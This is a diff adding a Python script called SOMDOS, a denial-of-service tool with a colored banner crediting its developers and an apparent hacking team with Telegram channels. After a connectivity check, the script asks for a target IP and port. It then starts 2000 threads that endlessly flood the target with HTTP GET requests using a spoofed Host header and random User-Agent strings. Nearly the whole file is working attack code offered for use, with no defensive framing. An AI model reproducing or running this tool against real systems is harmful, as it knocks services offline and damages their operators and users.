@@ -1,0 +1,67 @@
+import socket
+import threading
+import random
+import os
+import atexit
+
+os.system("clear")
+print("""
+\x1b[31m     ███████╗ ██████╗ ███╗   ███╗██████╗  ██████╗ ███████╗
+\x1b[31m     ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██╔═══██╗██╔════╝
+\x1b[31m     ███████╗██║   ██║██╔████╔██║██║  ██║██║   ██║███████╗
+\x1b[31m     ╚════██║██║   ██║██║╚██╔╝██║██║  ██║██║   ██║╚════██║
+\x1b[31m     ███████║╚██████╔╝██║ ╚═╝ ██║██████╔╝╚██████╔╝███████║
+\x1b[31m     ╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═════╝  ╚═════╝ ╚══════╝
+                                                    """)
+print("""\x1b[33m╔═══════════════════╦══════════════════════════════════════════╗
+\x1b[33m‖ ‣\x1b[0m \x1b[41mTOOL NAME       \x1b[0m\x1b[33m‖= \x1b[34mSOMDOS                                  \x1b[33m‖
+\x1b[33m‖ ‣\x1b[0m \x1b[41mDEVELOPER¹      \x1b[0m\x1b[33m‖= \x1b[34mAbdirihman Salah Mohamed                \x1b[33m‖
+\x1b[33m‖ ‣\x1b[0m \x1b[41mDEVELOPER²      \x1b[0m\x1b[33m‖= \x1b[34mKhapiip Abdirizaq Ali                   \x1b[33m‖
+\x1b[33m‖ ‣\x1b[0m \x1b[41mTEAM            \x1b[0m\x1b[33m‖= \x1b[34mANONYMOUSE SOMALIA                      \x1b[33m‖
+\x1b[33m‖ ‣\x1b[0m \x1b[41mTELEGRAM CHANNEL\x1b[0m\x1b[33m‖= \x1b[34m@Termuxan                               \x1b[33m‖
+\x1b[33m‖ ‣\x1b[0m \x1b[41mTELEGRAM CHANNEL\x1b[0m\x1b[33m‖= \x1b[34m@Anonymoussomalia1                      \x1b[33m‖
+\x1b[33m╠═══════════════════╩══════════════════════════════════════════╣
+\x1b[33m‖ \x1b[34m⁌\x1b[0m \x1b[42mDefault Port:\x1b[0m \x1b[41m80\x1b[0m                                         \x1b[34m⁍ \x1b[33m‖
+\x1b[33m╚══════════════════════════════════════════════════════════════╝""")
+
+def check_connection(host='8.8.8.8', port=53):
+    try:
+        socket.create_connection((host, port))
+    except OSError:
+        print("Network error: Unable to reach the server.")
+        print("Stopping the working...")
+        raise SystemExit
+# Call the function to check the connection
+check_connection()
+def get_user_input():
+    target_ip = input(" \x1b[34m⁍ \x1b[33mEnter the target IP:  \x1b[31m")
+    target_port = int(input(" \x1b[34m⁍ \x1b[33mEnter the target port:  \x1b[31m"))
+    fake_ip = "192.168.0.1"
+    print("""   \x1b[36mPlease Wait...\x1b[0m""");
+    return target_ip, target_port, fake_ip
+
+requests_sent = 0
+
+def attack(target_ip, target_port, fake_ip):
+    global requests_sent
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.5)
+            s.connect((target_ip, target_port))
+            headers = f"GET /{target_ip} HTTP/1.1\r\n"
+            headers += f"Host: {fake_ip}\r\n"
+            headers += f"User-Agent: {random.choice(['Mozilla/5.0', 'Android/7.0', 'Chrome/80.0.3987.87'])}\r\n"
+            headers += "Accept-language: en-US,en;q=0.9\r\n\r\n"
+            s.sendto(headers.encode("ascii"), (target_ip, target_port))
+            s.close()
+            requests_sent += 1
+            print(f"\x1b[33mRequests Sent: \x1b[34mTarget Ip: \x1b[36m{target_ip}  \x1b[34mport: \x1b[36m {target_port}   \x1b[33m{requests_sent}")
+        except:
+            pass
+
+# Get user input, initiate the supersonic attack, and keep countin'
+target_ip, target_port, fake_ip = get_user_input()
+for _ in range(2000):
+    thread = threading.Thread(target=attack, args=(target_ip, target_port, fake_ip))
+    thread.start()
